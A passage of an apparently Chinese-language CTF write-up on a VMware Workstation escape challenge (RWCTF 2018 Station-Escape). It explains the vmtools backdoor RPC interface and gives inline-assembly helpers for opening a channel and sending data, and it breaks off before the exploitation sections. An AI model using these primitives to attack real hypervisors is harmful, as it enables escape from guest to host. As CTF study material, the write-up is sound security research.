@@ -1,0 +1,1545 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="Kernel, Blockchain, CTF Crypto&PWN">
+      
+      
+        <link rel="canonical" href="https://beafb1b1.github.io/backup/realworldctf_2018_stationescape/">
+      
+      
+        <meta name="author" content="b1b1">
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.2">
+    
+    
+      
+        <title>RWCTF2018 station-escape - b1b1's share</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.30686662.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#3f51b5">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.74668098.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#realworldctf-final-station-escape-writeup" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://beafb1b1.github.io/" title="b1b1's share" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              b1b1's share
+            </span>
+            <span class="md-header-nav__topic">
+              
+                RWCTF2018 station-escape
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+<a href="https://github.com/beafb1b1/beafb1b1.github.io/" title="Go to repository" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    beafb1b1/beafb1b1.github.io
+  </div>
+</a>
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../.." class="md-tabs__link">
+        home
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../kernel/linux_kernel_base/" class="md-tabs__link">
+          kernel
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../blockchain/realworldctf_2019_bank/" class="md-tabs__link">
+          blockchain
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="./" class="md-tabs__link md-tabs__link--active">
+          backup
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="https://beafb1b1.github.io/" title="b1b1's share" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    b1b1's share
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+<a href="https://github.com/beafb1b1/beafb1b1.github.io/" title="Go to repository" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    beafb1b1/beafb1b1.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="home" class="md-nav__link">
+      home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      kernel
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        kernel
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kernel/linux_kernel_base/" title="linux内核基础" class="md-nav__link">
+      linux内核基础
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      blockchain
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        blockchain
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../blockchain/realworldctf_2019_bank/" title="RWCTF2019 bank" class="md-nav__link">
+      RWCTF2019 bank
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../blockchain/email_bot/" title="email bot" class="md-nav__link">
+      email bot
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
+    
+    <label class="md-nav__link" for="nav-4">
+      backup
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        backup
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        RWCTF2018 station-escape
+      </label>
+    
+    <a href="./" title="RWCTF2018 station-escape" class="md-nav__link md-nav__link--active">
+      RWCTF2018 station-escape
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    前置知识
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#open-rpc-channel" class="md-nav__link">
+    Open RPC channel
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#send-rpc-command-length" class="md-nav__link">
+    Send RPC command length
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#send-rpc-command-data" class="md-nav__link">
+    Send RPC command data
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#recieve-rpc-reply-length" class="md-nav__link">
+    Recieve RPC reply length
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#receive-rpc-reply-data" class="md-nav__link">
+    Receive RPC reply data
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#finish-receiving-rpc-reply" class="md-nav__link">
+    Finish receiving RPC reply
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#close-rpc-channel" class="md-nav__link">
+    Close RPC channel
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    漏洞分析
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    漏洞利用
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    关于调试
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    相关材料
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../gitpage_fuck/" title="gitpage采坑" class="md-nav__link">
+      gitpage采坑
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    前置知识
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#open-rpc-channel" class="md-nav__link">
+    Open RPC channel
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#send-rpc-command-length" class="md-nav__link">
+    Send RPC command length
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#send-rpc-command-data" class="md-nav__link">
+    Send RPC command data
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#recieve-rpc-reply-length" class="md-nav__link">
+    Recieve RPC reply length
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#receive-rpc-reply-data" class="md-nav__link">
+    Receive RPC reply data
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#finish-receiving-rpc-reply" class="md-nav__link">
+    Finish receiving RPC reply
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#close-rpc-channel" class="md-nav__link">
+    Close RPC channel
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    漏洞分析
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    漏洞利用
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    关于调试
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    相关材料
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/beafb1b1/beafb1b1.github.io/blob/dev/docs/backup/realworldctf_2018_stationescape.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                <h1 id="realworldctf-final-station-escape-writeup">RealWorldCTF Final Station-Escape Writeup<a class="headerlink" href="#realworldctf-final-station-escape-writeup" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p>RWCTF Final 2018是我们觉得非常不错的一次竞赛，非常贴近实战，其中每道题目都值得深入研究。其中Station-Escape是一道VMWare Workstation逃逸的题目，我们觉得非常cool，所以进行了详细分析，这里非常感谢**长亭科技**的**flyyy**师傅贡献的非常优秀的题目和悉心的技术指导。本文分析工作由**r3kapig**的**Ne0**和**bibi**完成。</p>
+</blockquote>
+<h2 id="_1">前置知识<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>在VMWare中，有一个奇特的攻击面，就是vmtools。vmtools帮助宿主机和客户机完成包括文件传输在内的一系列的通信和交互，其中使用了一种被称为backdoor的接口。backdoor接口是如何和宿主机进行通信的呢，我们观察backdoor函数的实现，可以发现如下代码：</p>
+<div class="codehilite"><pre><span></span><span class="n">MOV</span> <span class="n">EAX</span><span class="p">,</span> <span class="mi">564</span><span class="n">D5868h</span>                      <span class="cm">/* magic number     */</span>
+<span class="n">MOV</span> <span class="n">EBX</span><span class="p">,</span> <span class="n">command</span><span class="o">-</span><span class="n">specific</span><span class="o">-</span><span class="n">parameter</span>
+<span class="n">MOV</span> <span class="n">CX</span><span class="p">,</span>  <span class="n">backdoor</span><span class="o">-</span><span class="n">command</span><span class="o">-</span><span class="n">number</span>
+<span class="n">MOV</span> <span class="n">DX</span><span class="p">,</span>  <span class="mi">5658</span><span class="n">h</span>                          <span class="cm">/* VMware I/O Port  */</span>
+
+<span class="n">IN</span>  <span class="n">EAX</span><span class="p">,</span> <span class="n">DX</span> <span class="p">(</span><span class="n">or</span> <span class="n">OUT</span> <span class="n">DX</span><span class="p">,</span> <span class="n">EAX</span><span class="p">)</span>
+</pre></div>
+
+<p>首先需要明确的是，该接口在用户态就可以使用。在通常环境下，IN指令是一条特权指令，在普通用户态程序下是无法使用的。因此，运行这条指令会让用户态程序出错并陷出到hypervisor层，从而hypervisor层可以对客户机进行相关的操作和处理，因此利用此机制完成了通信。利用backdoor的通信机制，客户机便可以使用RPC进行一系列的操作，例如拖放、复制、获取信息、发送信息等等。</p>
+<p>backdoor机制所有的命令和调用方法，基本都是首先设置寄存器、然后调用IN或OUT特权指令的模式。那么我们使用backdoor传输RPC指令需要经过哪些步骤呢？我们以本题涉及到的backdoor操作进行说明：</p>
+<div class="codehilite"><pre><span></span>     <span class="o">+------------------+</span>
+     <span class="o">|</span> <span class="nx">Open</span> <span class="nx">RPC</span> <span class="nx">channel</span> <span class="o">|</span>
+     <span class="o">+---------+--------+</span>
+               <span class="o">|</span>
+  <span class="o">+------------</span><span class="nx">v</span><span class="o">-----------+</span>
+  <span class="o">|</span> <span class="nx">Send</span> <span class="nx">RPC</span> <span class="nx">command</span> <span class="nx">length</span><span class="o">|</span>
+  <span class="o">+------------+-----------+</span>
+               <span class="o">|</span>
+  <span class="o">+------------</span><span class="nx">v</span><span class="o">-----------+</span>
+  <span class="o">|</span> <span class="nx">Send</span> <span class="nx">RPC</span> <span class="nx">command</span> <span class="nx">data</span>  <span class="o">|</span>
+  <span class="o">+------------+-----------+</span>
+               <span class="o">|</span>
+ <span class="o">+-------------</span><span class="nx">v</span><span class="o">------------+</span>
+ <span class="o">|</span> <span class="nx">Recieve</span> <span class="nx">RPC</span> <span class="nx">reply</span> <span class="nx">length</span> <span class="o">|</span>
+ <span class="o">+-------------+------------+</span>
+               <span class="o">|</span>
+  <span class="o">+------------</span><span class="nx">v</span><span class="o">-----------+</span>
+  <span class="o">|</span> <span class="nx">Receive</span> <span class="nx">RPC</span> <span class="nx">reply</span> <span class="nx">data</span> <span class="o">|</span>
+  <span class="o">+------------+-----------+</span>
+               <span class="o">|</span>
+<span class="o">+--------------</span><span class="nx">v</span><span class="o">-------------+</span>
+<span class="o">|</span> <span class="nx">Finish</span> <span class="nx">receiving</span> <span class="nx">RPC</span> <span class="nx">reply</span> <span class="o">|</span>
+<span class="o">+--------------+-------------+</span>
+               <span class="o">|</span>
+     <span class="o">+---------</span><span class="nx">v</span><span class="o">---------+</span>
+     <span class="o">|</span> <span class="nx">Close</span> <span class="nx">RPC</span> <span class="nx">channel</span> <span class="o">|</span>
+     <span class="o">+-------------------+</span>
+</pre></div>
+
+<blockquote>
+<p>以下内容主要参考（该文档和真实逆向情况略有出入，将会在后文中说明）：<a href="https://sites.google.com/site/chitchatvmback/backdoor">https://sites.google.com/site/chitchatvmback/backdoor</a></p>
+</blockquote>
+<h3 id="open-rpc-channel">Open RPC channel<a class="headerlink" href="#open-rpc-channel" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>RPC subcommand：00h</p>
+</blockquote>
+<p>调用IN（OUT）前，需要设置的寄存器内容：</p>
+<div class="codehilite"><pre><span></span><span class="n">EAX</span> <span class="o">=</span> <span class="mi">564</span><span class="n">D5868h</span> <span class="o">-</span> <span class="n">magic</span> <span class="n">number</span>
+<span class="n">EBX</span> <span class="o">=</span> <span class="mi">49435052</span><span class="n">h</span> <span class="o">-</span> <span class="n">RPC</span> <span class="n">open</span> <span class="n">magic</span> <span class="n">number</span> <span class="p">(</span><span class="err">&#39;</span><span class="n">RPCI</span><span class="err">&#39;</span><span class="p">)</span>
+<span class="n">ECX</span><span class="p">(</span><span class="n">HI</span><span class="p">)</span> <span class="o">=</span> <span class="mo">0000</span><span class="n">h</span> <span class="o">-</span> <span class="n">subcommand</span> <span class="n">number</span>
+<span class="n">ECX</span><span class="p">(</span><span class="n">LO</span><span class="p">)</span> <span class="o">=</span> <span class="mo">001</span><span class="n">Eh</span> <span class="o">-</span> <span class="n">command</span> <span class="n">number</span>
+<span class="n">EDX</span><span class="p">(</span><span class="n">LO</span><span class="p">)</span> <span class="o">=</span> <span class="mi">5658</span><span class="n">h</span> <span class="o">-</span> <span class="n">port</span> <span class="n">number</span>
+</pre></div>
+
+<p>返回值：</p>
+<div class="codehilite"><pre><span></span><span class="n">ECX</span> <span class="o">=</span> <span class="mo">00010000</span><span class="nl">h</span><span class="p">:</span> <span class="n">success</span> <span class="o">/</span> <span class="mo">00000000</span><span class="nl">h</span><span class="p">:</span> <span class="n">failure</span>
+<span class="n">EDX</span><span class="p">(</span><span class="n">HI</span><span class="p">)</span> <span class="o">=</span> <span class="n">RPC</span> <span class="n">channel</span> <span class="n">number</span>
+</pre></div>
+
+<p>该功能用于打开RPC的channel，其中ECX会返回是否成功，EDX返回值会返回一个channel的编号，在后续的RPC通信中，将使用该编号。这里需要注意的是，在单个虚拟机中只能同时使用8个channel（<code>#0 - #7</code>）,当尝试打开第9个channel的时候，会检查其他channel的打开时间，如果时间过了某一个值，会将超时的channel关闭，再把这个channel的编号返回；如果都没有超时，create channel会失败。</p>
+<p>我们可以使用如下函数实现Open RPC channel的过程：</p>
+<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">channel_open</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+     <span class="k">asm</span><span class="p">(</span><span class="s">&quot;movl %%eax,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movq %%rdi,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movq %%rsi,%%r11</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movq %%rdx,%%r12</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%rcx,%%r13</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0xc9435052,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x1e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x5658,%%edx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;out %%eax,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl %%edi,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl %%esi,(%%r11)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl %%edx,(%%r12)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%ecx,(%%r13)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="o">:</span>
+                <span class="o">:</span>
+                <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r8&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span><span class="p">,</span><span class="s">&quot;%r11&quot;</span><span class="p">,</span><span class="s">&quot;%r12&quot;</span><span class="p">,</span><span class="s">&quot;%r13&quot;</span>
+        <span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+<h3 id="send-rpc-command-length">Send RPC command length<a class="headerlink" href="#send-rpc-command-length" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>RPC subcommand：01h</p>
+</blockquote>
+<p>调用：</p>
+<div class="codehilite"><pre><span></span><span class="n">EAX</span> <span class="o">=</span> <span class="mi">564</span><span class="n">D5868h</span> <span class="o">-</span> <span class="n">magic</span> <span class="n">number</span>
+<span class="n">EBX</span> <span class="o">=</span> <span class="n">command</span> <span class="n">length</span> <span class="p">(</span><span class="n">not</span> <span class="n">including</span> <span class="n">the</span> <span class="n">terminating</span> <span class="nb">NULL</span><span class="p">)</span>
+<span class="n">ECX</span><span class="p">(</span><span class="n">HI</span><span class="p">)</span> <span class="o">=</span> <span class="mo">0001</span><span class="n">h</span> <span class="o">-</span> <span class="n">subcommand</span> <span class="n">number</span>
+<span class="n">ECX</span><span class="p">(</span><span class="n">LO</span><span class="p">)</span> <span class="o">=</span> <span class="mo">001</span><span class="n">Eh</span> <span class="o">-</span> <span class="n">command</span> <span class="n">number</span>
+<span class="n">EDX</span><span class="p">(</span><span class="n">HI</span><span class="p">)</span> <span class="o">=</span> <span class="n">channel</span> <span class="n">number</span>
+<span class="n">EDX</span><span class="p">(</span><span class="n">LO</span><span class="p">)</span> <span class="o">=</span> <span class="mi">5658</span><span class="n">h</span> <span class="o">-</span> <span class="n">port</span> <span class="n">number</span>
+</pre></div>
+
+<p>返回值：</p>
+<div class="codehilite"><pre><span></span><span class="n">ECX</span> <span class="o">=</span> <span class="mo">00</span><span class="mi">810000</span><span class="nl">h</span><span class="p">:</span> <span class="n">success</span> <span class="o">/</span> <span class="mo">00000000</span><span class="nl">h</span><span class="p">:</span> <span class="n">failure</span>
+</pre></div>
+
+<p>在发送RPC command前，需要先发送RPC command的长度，需要注意的是，此时我们输入的channel number所指向的channel必须处于已经open的状态。ECX会返回是否成功发送。具体实现如下：</p>
+<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">channel_set_len</span><span class="p">(</span><span class="kt">int</span> <span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="n">len</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+    <span class="k">asm</span><span class="p">(</span><span class="s">&quot;movl %%eax,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%r8,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl %%ecx,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x0001001e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movw $0x5658,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;out %%eax,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl %%ecx,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="o">:</span>
+                <span class="o">:</span>
+            <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span>
+    <span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+<h3 id="send-rpc-command-data">Send RPC command data<a class="headerlink" href="#send-rpc-command-data" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>RPC subcommand：02h</p>
+</blockquote>
+<p>调用：</p>
+<div class="codehilite"><pre><span></span><span class="n">EAX</span> <span class="o">=</span> <span class="mi">564</span><span class="n">D5868h</span> <span class="o">-</span> <span class="n">magic</span> <span class="n">number</span>
+<span class="n">EBX</span> <span class="o">=</span> <span class="mi">4</span> <span class="n">bytes</span> <span class="n">from</span> <span class="n">the</span> <span class="n">command</span> <span class="n">data</span> <span class="p">(</span><span class="n">the</span> <span class="n">first</span> <span class="n">byte</span> <span class="n">in</span> <span class="n">LSB</span><span class="p">)</span>
+<span class="n">ECX</span><span class="p">(</span><span class="n">HI</span><span class="p">)</span> <span class="o">=</span> <span class="mo">0002</span><span class="n">h</span> <span class="o">-</span> <span class="n">subcommand</span> <span class="n">number</span>
+<span class="n">ECX</span><span class="p">(</span><span class="n">LO</span><span class="p">)</span> <span class="o">=</span> <span class="mo">001</span><span class="n">Eh</span> <span class="o">-</span> <span class="n">command</span> <span class="n">number</span>
